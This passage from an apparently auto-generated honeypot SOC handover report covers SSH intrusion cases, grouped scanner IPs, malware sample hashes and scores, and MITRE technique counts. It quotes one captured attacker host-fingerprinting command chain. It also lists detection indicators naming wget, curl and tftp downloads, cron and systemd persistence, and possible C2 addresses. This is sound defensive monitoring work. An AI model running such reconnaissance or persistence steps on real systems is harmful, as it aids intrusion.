| `2026-09-25 14:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f85b74c1d104

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:52 |
| **Last Seen** | 2026-09-25 14:52 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:52:32` | `cowrie.session.connect` |
| `2026-09-25 14:52:34` | `cowrie.client.version` |
| `2026-09-25 14:52:34` | `cowrie.client.kex` |
| `2026-09-25 14:52:43` | `cowrie.login.success` |
| `2026-09-25 14:52:47` | `cowrie.session.params` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.command.success` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.command.input` |
| `2026-09-25 14:52:47` | `cowrie.log.closed` |
| `2026-09-25 14:52:48` | `cowrie.session.params` |
| `2026-09-25 14:52:48` | `cowrie.command.input` |
| `2026-09-25 14:52:49` | `cowrie.log.closed` |
| `2026-09-25 14:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `193.112.192[.]91` | **13** | 2026-09-25 12:07 | 2026-09-25 12:14 | 0m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.33.80[.]243` | **6** | 2026-09-25 12:35 | 2026-09-25 13:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **5** | 2026-09-25 11:12 | 2026-09-25 14:43 | 4m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **5** | 2026-09-25 12:49 | 2026-09-25 14:20 | 4m | 0 | `T1592` | 🟢 LOW |
| `181.46.57[.]8` | **4** | 2026-09-25 11:20 | 2026-09-25 11:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.36.123[.]61` | **4** | 2026-09-25 12:00 | 2026-09-25 12:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]220` | **3** | 2026-09-25 14:36 | 2026-09-25 14:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]61` | **3** | 2026-09-25 12:58 | 2026-09-25 12:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **3** | 2026-09-25 14:28 | 2026-09-25 14:55 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-09-25 14:44 | 2026-09-25 14:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.230.92[.]53` | **2** | 2026-09-25 10:57 | 2026-09-25 10:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]115` | **2** | 2026-09-25 12:01 | 2026-09-25 12:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.146[.]250` | 1 | 2026-09-25 11:49 | 2026-09-25 11:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.72.177[.]230` | 1 | 2026-09-25 12:45 | 2026-09-25 12:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.234[.]151` | 1 | 2026-09-25 12:19 | 2026-09-25 12:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.103[.]211` | 1 | 2026-09-25 10:57 | 2026-09-25 10:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-09-25 12:42 | 2026-09-25 12:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-09-25 11:54 | 2026-09-25 11:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-09-25 11:07 | 2026-09-25 11:07 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.152.243[.]192` | 1 | 2026-09-25 14:03 | 2026-09-25 14:04 | 21s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]118` | 1 | 2026-09-25 12:01 | 2026-09-25 12:01 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-09-25 13:35 | 2026-09-25 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-09-25 14:36 | 2026-09-25 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-09-25 12:35 | 2026-09-25 12:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-09-25 14:36 | 2026-09-25 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-09-25 13:35 | 2026-09-25 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.76.97[.]173` | 1 | 2026-09-25 14:19 | 2026-09-25 14:19 | 21s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-09-25 13:06 | 2026-09-25 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-09-25 13:24 | 2026-09-25 13:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]38` | 1 | 2026-09-25 13:18 | 2026-09-25 13:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]121` | 1 | 2026-09-25 12:33 | 2026-09-25 12:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-09-25 13:22 | 2026-09-25 13:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.244.58[.]222` | 1 | 2026-09-25 14:22 | 2026-09-25 14:22 | 12s | 0 | `T1592` | 🟢 LOW |
| `85.165.104[.]58` | 1 | 2026-09-25 13:57 | 2026-09-25 13:57 | 30s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-25 13:58 | 2026-09-25 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-25 11:54 | 2026-09-25 11:55 | 29s | 0 | `T1592` | 🟢 LOW |
| `95.31.253[.]126` | 1 | 2026-09-25 13:40 | 2026-09-25 13:40 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.33.12[.]214` | US | Linode | **100** ⚠️ | 50 |
| `77.90.185[.]17` | LT | Limited Network LTD | **100** ⚠️ | 50 |
| `211.254.212[.]59` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `95.188.91[.]101` | RU | OJSC Rostelecom | **100** ⚠️ | 50 |
| `147.90.234[.]22` | US | Fourplex Telecom LLC | **100** ⚠️ | 3 |
| `106.12.146[.]250` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 4 |
| `45.33.12[.]122` | US | Linode | **100** ⚠️ | 50 |
| `34.91.0[.]68` | NL | Google LLC | **100** ⚠️ | 50 |
| `95.31.253[.]126` | RU | PJSC Vimpelcom | **100** ⚠️ | 1 |
| `45.79.115[.]59` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 130 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 95 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 18 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 13 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |

---

## 🔕 False Positive Summary (45 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 217 cases |
| Tool 34  | Credential Extractor        | ✅ 144 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 45 filtered (20.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 39 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 95 priority case(s) shown individually · 37 recon entry/entries in table (12 group(s) consolidating 52 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-25T16:53:35Z_
